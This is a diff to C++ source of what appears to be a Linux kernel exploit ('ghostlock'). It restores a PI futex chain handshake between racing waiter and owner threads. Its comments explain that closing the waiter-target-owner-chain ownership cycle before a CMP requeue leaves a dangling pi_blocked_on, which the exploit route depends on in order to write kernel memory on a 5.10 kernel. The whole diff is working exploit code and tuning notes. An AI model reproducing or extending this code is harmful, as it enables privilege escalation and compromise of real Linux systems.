@@ -147,13 +147,24 @@ namespace ghostlock::race {
         support::disable_rseq_for_thread();
         int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
         race->waiter_tid.store(tid);
-        /* 5.10: the chain_futex PI handshake (waiter LOCK_PI(chain) vs owner
-         * LOCK_PI(chain) while holding target) forms the ownership cycle
-         * waiter->target->owner->chain->waiter; the kernel's
-         * futex_lock_pi_atomic deadlock check then rejects the CMP requeue
-         * with -EDEADLK every attempt. The handshake is order-only — the
-         * owner_chain_done flag already carries it — so on this target the
-         * chain futex is not touched at all. */
+        /* v11: restore the full CLI chain handshake (main.c:149, 6/6 on this
+         * exact kernel). The waiter must OWN the chain futex while the CMP
+         * requeue parks it on target (held by the owner); the owner then
+         * blocks on the chain, closing the waiter->target->owner->chain
+         * cycle. The kernel's PI requeue/boost walk mishandles that cycle
+         * and wakes the waiter with a dangling pi_blocked_on — the premise
+         * of the whole route. v6 removed both LOCK_PI calls after an
+         * EDEADLK that the CLI avoids by firing CMP from the main thread
+         * strictly after owner_started + a 50ms settle, which run() already
+         * matches (race_setup_settle_us=50000). Without the cycle the wakeup
+         * clears pi_blocked_on and rt_mutex_adjust_pi short-circuits: the
+         * route reports clean=1/1 and never writes (run15 proof). */
+        long chain_lock = support::futex_op(&race->chain_futex,
+                                            FUTEX_LOCK_PI, 0, nullptr,
+                                            nullptr, 0);
+        if (chain_lock != 0) {
+            pr_error("waiter lock chain errno=%d\n", errno);
+        }
         race->waiter_ready.store(1);
         while (!race->owner_started.load())
             usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
@@ -197,8 +208,13 @@ namespace ghostlock::race {
             pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
         }
         race->route_done.store(1);
-        /* chain_futex is not part of the 5.10 handshake (see probe note at
-         * thread start); owner_chain_done is a plain atomic flag here. */
+        /* v11: release the chain so the owner's blocking LOCK_PI wakes and
+         * marks owner_chain_done (CLI main.c:163) — same ordering. */
+        (void) support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0,
+                                 nullptr, nullptr, 0);
+        /* v11: the UNLOCK_PI above is what wakes the owner's blocking
+         * LOCK_PI, so owner_chain_done is normally set before this poll
+         * even runs once. */
         while (!race->owner_chain_done.load())
             usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
         return nullptr;
@@ -220,9 +236,18 @@ namespace ghostlock::race {
             return nullptr;
         }
         race->owner_started.store(1);
-        /* 5.10: no chain_futex LOCK_PI here — see waiter_thread probe note;
-         * blocking on a PI futex held by the waiter would close the
-         * waiter->target->owner->chain ownership cycle and EDEADLK the CMP. */
+        /* v11: restore the CLI owner handshake (main.c:170): block on the
+         * chain futex held by the waiter. This closes the ownership cycle
+         * before the CMP requeue fires; the waiter's post-route UNLOCK_PI
+         * wakes us here. The v6 "no chain LOCK" workaround silently removed
+         * the cycle and with it the dangling pi_blocked_on the route lives
+         * on (run15: clean=1/1, zero writes). */
+        long chain_block = support::futex_op(&race->chain_futex,
+                                             FUTEX_LOCK_PI, 0, nullptr,
+                                             nullptr, 0);
+        if (chain_block != 0) {
+            pr_error("owner lock chain errno=%d\n", errno);
+        }
         race->owner_chain_done.store(1);
         while (!race->owner_stop.load()) sleep(1);
         if (lock_target == 0)
